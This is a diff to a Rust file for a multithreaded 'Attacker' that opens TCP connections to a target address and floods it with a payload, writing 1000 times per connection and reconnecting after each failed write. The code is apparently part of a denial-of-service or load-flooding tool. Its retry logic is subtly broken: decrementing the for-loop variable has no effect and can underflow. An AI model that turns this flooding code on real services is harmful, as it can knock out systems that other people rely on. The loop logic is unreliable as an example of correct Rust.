@@ -16,10 +16,15 @@ use std::sync::mpsc::TryRecvError::Disconnected;
 use std::sync::mpsc::{Receiver, SendError};
 use std::sync::Arc;
 use std::{io, net};
+use async_std::prelude::FutureExt;
+use itertools::Itertools;
+use tokio::task::JoinError;
+
+const ATTACKS_PER_THREAD: usize = 1000;
 
 /**
-* Signals that can be sent to an Attacker object
-*/
+ * Signals that can be sent to an Attacker object
+ */
 #[derive(Eq, PartialEq)]
 enum Signal {
     START,
@@ -29,29 +34,41 @@ enum Signal {
 
 pub struct Attacker {
     signal_sender: Sender<Signal>,
-    future: Pin<Box<dyn Future<Output = Result<(), Vec<Error>>> + 'static>>,
+    future: tokio::task::JoinHandle<Result<(), Vec<Error>>>,
 }
 
 /**
-* Gets moved to the thread that attacks a target
-*/
+ * Gets moved to the thread that attacks a target
+ */
 struct AttackerThread {
     address: SocketAddr,
     attacks_per_cycle: usize,
     payload: Vec<u8>,
     signal_rec: Receiver<Signal>,
-    counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>,
+    counter: Arc<dyn AtomicCounter<PrimitiveType=usize>>,
 }
 
 impl AttackerThread {
-    fn attack_once(address: &SocketAddr, payload: &[u8]) -> io::Result<()> {
+    fn attack_once(address: &SocketAddr, payload: &[u8], counter: Arc<dyn AtomicCounter<PrimitiveType=usize>>) -> io::Result<()> {
         let mut connection = TcpStream::connect(address)?;
-        // print!("connected ... ");
-        connection.write_all(payload)?;
-        // let mut resp = String::new();
-        // connection.read_to_string(&mut resp)?;
-        // println!("Response: {}", resp);
-        // print!("attacked");
+        for mut i in 0..ATTACKS_PER_THREAD {
+            let err_write =connection.write_all(payload);
+            let err_flush = connection.flush();
+
+            if let Err(err) = err_write {
+                i -= 1;
+                connection = TcpStream::connect(address)?;
+                continue;
+            }
+
+            if let Err(err) = err_flush {
+                i -= 1;
+                connection = TcpStream::connect(address)?;
+                continue;
+            }
+
+            counter.inc();
+        }
         Ok(())
     }
 
@@ -63,8 +80,7 @@ impl AttackerThread {
         let errors = (0..self.attacks_per_cycle)
             .into_par_iter()
             .map(move |_| {
-                Self::attack_once(addr, payload)?;
-                counter_clone.inc();
+                Self::attack_once(addr, payload, counter_clone.clone())?;
                 Ok(())
             })
             .filter(|maybe_err| maybe_err.is_err())
@@ -113,7 +129,7 @@ impl Attacker {
         address: SocketAddr,
         payload: Vec<u8>,
         attacks_per_cycle: usize,
-        attack_counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>,
+        attack_counter: Arc<dyn AtomicCounter<PrimitiveType=usize>>,
     ) -> std::io::Result<Attacker> {
         let (send, rec) = std::sync::mpsc::channel();
 
@@ -127,13 +143,15 @@ impl Attacker {
 
         let mut attacker = Attacker {
             signal_sender: send,
-            future: Box::pin(attacker_thread.run()),
+            future: tokio::spawn(async move {
+                attacker_thread.run().await
+            }),
         };
 
         return Ok(attacker);
     }
 
-    pub async fn run(self) -> Result<(), Vec<Error>> {
+    pub async fn run(self) -> Result<Result<(), Vec<Error>>, JoinError> {
         self.future.await
     }
 
